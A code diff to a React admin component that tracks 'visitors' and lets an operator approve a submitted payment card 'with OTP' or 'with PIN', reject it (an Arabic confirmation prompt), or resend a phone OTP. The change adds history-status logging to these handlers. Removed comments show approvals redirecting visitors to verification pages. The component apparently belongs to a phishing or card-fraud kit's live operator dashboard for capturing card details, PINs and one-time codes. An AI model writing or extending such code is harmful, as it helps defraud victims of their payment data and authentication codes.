@@ -13,7 +13,8 @@ import {
   handleOtpRejection,
   handlePhoneOtpApproval,
   handlePhoneOtpRejection,
-  handlePhoneOtpResend
+  handlePhoneOtpResend,
+  updateHistoryStatus
 } from "@/lib/history-actions"
 import { _d } from "@/lib/secure-utils"
 
@@ -437,14 +438,17 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       switch (bubble.type) {
         case "card":
           if (action === "otp") {
-            // Approve card with OTP - redirect to /veri
+            // Approve card with OTP - update history status
+            await updateHistoryStatus(visitor.id, bubble.id, "approved_with_otp", visitor.history || [])
             await updateApplication(visitor.id, { cardStatus: "approved_with_otp" })
           } else if (action === "pin") {
-            // Approve card with PIN - redirect to /confi
+            // Approve card with PIN - update history status
+            await updateHistoryStatus(visitor.id, bubble.id, "approved_with_pin", visitor.history || [])
             await updateApplication(visitor.id, { cardStatus: "approved_with_pin" })
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
-              // Reject card - save to oldCards and reset
+              // Reject card - update history status
+              await updateHistoryStatus(visitor.id, bubble.id, "rejected", visitor.history || [])
               await updateApplication(visitor.id, { cardStatus: "rejected" })
             }
           }
@@ -482,6 +486,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               // Phone OTP rejected
             }
           } else if (action === "resend") {
+            await updateHistoryStatus(visitor.id, bubbleId, "resend", visitor.history || [])
             await updateApplication(visitor.id, {
               phoneOtp: "",
               phoneOtpStatus: "show_phone_otp"
